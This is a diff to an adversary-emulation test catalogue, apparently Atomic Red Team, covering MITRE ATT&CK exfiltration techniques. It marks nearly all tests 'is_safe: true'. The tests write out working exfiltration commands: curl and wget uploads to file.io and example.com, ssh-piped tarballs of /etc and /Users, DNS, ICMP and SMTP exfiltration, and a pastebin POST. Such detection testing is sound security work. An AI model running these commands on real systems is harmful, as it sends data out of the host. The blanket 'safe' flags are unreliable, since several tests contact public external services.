@@ -24,6 +24,7 @@
         $fileName = "C:\temp\T1020_exfilFile.txt"
         Remove-Item -Path $fileName -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Exfiltration via Encrypted FTP
       type: powershell
       platform: windows
@@ -35,9 +36,10 @@
         Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential $creds
       cleanup: Remove-Item -Path "C:\temp\T1020__FTP_sample.txt" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1020
-  is_safe: false
+  is_safe: true
 - id: T1030
   name: Data Transfer Size Limits
   description: An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.
@@ -55,6 +57,7 @@
         ls -l /tmp/T1030
       cleanup: if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;
       timeout: 60
+      is_safe: true
     - name: Data Transfer Size Limits
       type: sh
       platform: linux
@@ -63,6 +66,7 @@
         ls -l /tmp/T1030
       cleanup: if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;
       timeout: 60
+      is_safe: true
     - name: Network-Based Data Transfer in Small Chunks
       type: powershell
       platform: windows
@@ -77,9 +81,10 @@
         }
         $file.Close()
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1030
-  is_safe: false
+  is_safe: true
 - id: T1041
   name: Exfiltration Over C2 Channel
   description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.
@@ -94,6 +99,7 @@
       platform: windows
       command: "if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ \n  1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt\nInvoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive"
       timeout: 120
+      is_safe: true
     - name: Text Based Data Exfiltration using DNS subdomains
       type: powershell
       platform: windows
@@ -112,9 +118,10 @@
             Start-Sleep -Seconds 5
         }
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1041
-  is_safe: false
+  is_safe: true
 - id: T1048
   name: Exfiltration Over Alternative Protocol
   description: "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](http..."
@@ -129,21 +136,25 @@
       platform: macos
       command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
       timeout: 60
+      is_safe: true
     - name: Exfiltration Over Alternative Protocol - SSH
       type: sh
       platform: linux
       command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
       timeout: 60
+      is_safe: true
     - name: Exfiltration Over Alternative Protocol - SSH (2)
       type: sh
       platform: macos
       command: tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
       timeout: 60
+      is_safe: true
     - name: Exfiltration Over Alternative Protocol - SSH (2)
       type: sh
       platform: linux
       command: tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
       timeout: 60
+      is_safe: true
     - name: DNSExfiltration (doh)
       type: powershell
       platform: windows
@@ -151,19 +162,22 @@
         Import-Module "PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1"
         Invoke-DNSExfiltrator -i "PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500
       timeout: 120
+      is_safe: true
     - name: Exfiltrate Data using DNS Queries via dig
       type: bash
       platform: macos
       command: dig @8.8.8.8 -p 53 $(echo "this is a secret info" | base64).google.com
       timeout: 60
+      is_safe: true
     - name: Exfiltrate Data using DNS Queries via dig
       type: bash
       platform: linux
       command: dig @8.8.8.8 -p 53 $(echo "this is a secret info" | base64).google.com
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1048
-  is_safe: false
+  is_safe: true
 - id: T1048.002
   name: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
   description: "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each e..."
@@ -178,29 +192,34 @@
       platform: windows
       command: C:\Windows\System32\Curl.exe -k -F "file=@PathToAtomicsFolder/T1048.002/src/artifact" https://file.io/
       timeout: 120
+      is_safe: true
     - name: Exfiltrate data HTTPS using curl freebsd,linux or macos
       type: bash
       platform: macos
       command: curl -F 'file=@PathToAtomicsFolder/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
       timeout: 60
+      is_safe: true
     - name: Exfiltrate data HTTPS using curl freebsd,linux or macos
       type: bash
       platform: linux
       command: curl -F 'file=@PathToAtomicsFolder/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
       timeout: 60
+      is_safe: true
     - name: Exfiltrate data in a file over HTTPS using wget
       type: sh
       platform: linux
       command: wget --post-file="PathToAtomicsFolder/T1048.002/src/artifact" --timeout=5 --no-check-certificate https://example.com/ --delete-after
       timeout: 60
+      is_safe: true
     - name: Exfiltrate data as text over HTTPS using wget
       type: sh
       platform: linux
       command: wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1048/002
-  is_safe: false
+  is_safe: true
 - id: T1048.003
   name: Exfiltration Over Unencrypted Non-C2 Protocol
   description: |-
@@ -218,6 +237,7 @@
       platform: windows
       command: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
       timeout: 120
+      is_safe: true
     - name: Exfiltration Over Alternative Protocol - HTTP
       type: powershell
       platform: windows
@@ -225,11 +245,13 @@
         $content = Get-Content C:\Windows\System32\notepad.exe
         Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content
       timeout: 120
+      is_safe: true
     - name: Exfiltration Over Alternative Protocol - SMTP
       type: powershell
       platform: windows
       command: Send-MailMessage -From test@corp.com -To test@corp.com -Subject "T1048.003 Atomic Test" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1
       timeout: 120
+      is_safe: true
     - name: MAZE FTP Upload
       type: powershell
       platform: windows
@@ -254,6 +276,7 @@
          $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
          $ftp_del.GetResponse()}} catch{}
       timeout: 120
+      is_safe: true
     - name: Exfiltration Over Alternative Protocol - FTP - Rclone
       type: powershell
       platform: windows
@@ -264,6 +287,7 @@
         &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Python3 http.server
       type: sh
       platform: linux
@@ -271,9 +295,10 @@
         [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
         if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1048/003
-  is_safe: false
+  is_safe: true
 - id: T1567.002
   name: Exfiltration to Cloud Storage
   description: |-
@@ -305,6 +330,7 @@
         Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"
         Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" -recurse -force
       timeout: 120
+      is_safe: true
     - name: Exfiltrate data with rclone to cloud Storage - AWS S3
       type: powershell
       platform: linux
@@ -351,6 +377,7 @@
         $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var "aws_region=us-east-1" -auto-approve
         Write-Host "Done!"
       timeout: 120
+      is_safe: true
     - name: Exfiltrate data with rclone to cloud Storage - AWS S3
       type: powershell
       platform: macos
@@ -397,9 +424,10 @@
         $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var "aws_region=us-east-1" -auto-approve
         Write-Host "Done!"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1567/002
-  is_safe: false
+  is_safe: true
 - id: T1567.003
   name: Exfiltration to Text Storage Sites
   description: "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption..."
@@ -424,6 +452,7 @@
         $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
         Write-Host "Your paste URL: $response"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1567/003
-  is_safe: false
+  is_safe: true
